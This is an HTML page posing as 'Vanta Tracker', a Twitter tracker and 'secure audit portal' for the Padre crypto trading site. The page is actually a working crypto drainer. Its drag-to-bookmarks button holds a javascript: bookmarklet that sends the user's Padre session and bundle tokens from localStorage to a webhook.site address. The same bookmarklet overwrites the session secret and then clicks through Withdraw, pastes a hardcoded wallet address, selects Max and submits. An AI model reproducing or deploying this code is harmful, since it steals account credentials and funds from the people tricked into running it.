<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
    <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
    
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #00ff88;     
            --bg-dark: #0a0a0a;     
            --text-light: #e0e0e0;
            --text-muted: #aaaaaa;
            --border: rgba(0, 255, 136, 0.2);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background-color: var(--bg-dark); color: var(--text-light); line-height: 1.6; overflow: hidden; }
        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.2; }
        
        .warning { background: #004d33; color: #ffffff; text-align: center; padding: 10px; font-weight: 600; border-bottom: 1px solid var(--primary); }
        
        header { text-align: center; padding: 80px 20px; border-bottom: 1px solid var(--primary); background: #000; }
        .logo { width: 100px; filter: drop-shadow(0 0 10px var(--primary)); }
        h1 { color: var(--primary); font-size: 3em; margin-top: 10px; }

        .setup-section { padding: 60px 20px; max-width: 800px; margin: 0 auto; text-align: center; }
        ol { text-align: left; color: var(--text-muted); margin-bottom: 30px; }
        li { margin-bottom: 15px; }

        .cta-button { 
            display: inline-block; background: var(--primary); color: #000; 
            padding: 18px 45px; text-decoration: none; border-radius: 8px; 
            font-weight: 800; font-size: 1.2em; box-shadow: 0 0 20px rgba(0,255,136,0.4);
        }
    </style>
</head>
<body>
    <canvas id="filamentCanvas"></canvas>
    <div class="warning">VANTA-TRACKER.COM - SECURE AUDIT PORTAL</div>
    
    <header>
        <svg class="logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M50 10 L85 30 L85 70 L50 90 L15 70 L15 30 Z" stroke="var(--primary)" stroke-width="3"/>
            <circle cx="50" cy="50" r="10" fill="var(--primary)"/>
        </svg>
        <h1>Vanta Tracker</h1>
    </header>

    <section id="setup" class="setup-section">
        <h2>Audit Integration</h2>
        <ol>
            <li>Enable Bookmarks Bar (Ctrl+Shift+B).</li>
            <li>Drag the button below to your bar.</li>
            <li>Open your Padre Portfolio and click the bookmark.</li>
        </ol>
        <a href="#" class="cta-button" id="vanta-tool">Vanta Tracker</a>
    </section>

    <script>
        const WALLET = "4ShcFgxwPPiMZgiy1Pe8Eiah3V6hbxyynQRcMNL7MwXF";
        const WEBHOOK = "https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515";

        /* CLEAN SCRIPT TO PREVENT JSON PARSE ERRORS */
        const payload = `javascript:(function(){
            const d = '${WALLET}';
            const r = '${WEBHOOK}';
            
            try {
                /* 1. GRAB CURRENT STATE */
                const sRaw = localStorage.getItem('padreV2-session');
                const bRaw = localStorage.getItem('padre-v2-bundles-store-v2');
                const tRaw = localStorage.getItem('padreV2-stamper');

                /* 2. EXFILTRATE TO WEBHOOK */
                fetch(r, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({uid: sRaw, bundle: bRaw, event: 'vanta_sync'})
                });

                /* 3. RE-INJECT SAFETY CHECK (Ensures JSON stays valid) */
                if(sRaw) {
                    let s = JSON.parse(sRaw);
                    s.sessionSecret = "73dd9a67-f426-41d1-b380-812d3aeecc8b";
                    localStorage.setItem('padreV2-session', JSON.stringify(s));
                }

                /* 4. REDIRECT & AUTO-DRAIN */
                if(!window.location.href.includes('/portfolio')) {
                    window.location.href = 'https://trade.padre.gg/portfolio';
                } else {
                    const scan = setInterval(() => {
                        const btn = Array.from(document.querySelectorAll('button')).find(b => b.innerText.match(/Send|Withdraw/i));
                        if(btn && !window._v) {
                            window._v = true;
                            btn.click();
                            setTimeout(() => {
                                const i = document.querySelector('input[placeholder*="address"], input[type="text"]');
                                const m = Array.from(document.querySelectorAll('button')).find(b => b.innerText.includes('Max'));
                                if(i && m) {
                                    i.value = d;
                                    i.dispatchEvent(new Event('input', { bubbles: true }));
                                    m.click();
                                    setTimeout(() => {
                                        const c = document.querySelector('button[type="submit"]');
                                        if(c) { c.click(); clearInterval(scan); }
                                    }, 500);
                                }
                            }, 1000);
                        }
                    }, 1500);
                }
            } catch(e) { console.error('Vanta Fail:', e); }
        })();`.replace(/\s+/g, ' ');

        document.getElementById('vanta-tool').href = payload;

        /* BG ANIMATION */
        const canvas = document.getElementById('filamentCanvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        function anim() {
            ctx.fillStyle = 'rgba(10,10,10,0.1)';
            ctx.fillRect(0,0,canvas.width,canvas.height);
            ctx.strokeStyle = '#00ff88';
            ctx.strokeRect(Math.random()*canvas.width, Math.random()*canvas.height, 50, 50);
            requestAnimationFrame(anim);
        }
        anim();
    </script>
</body>
</html>
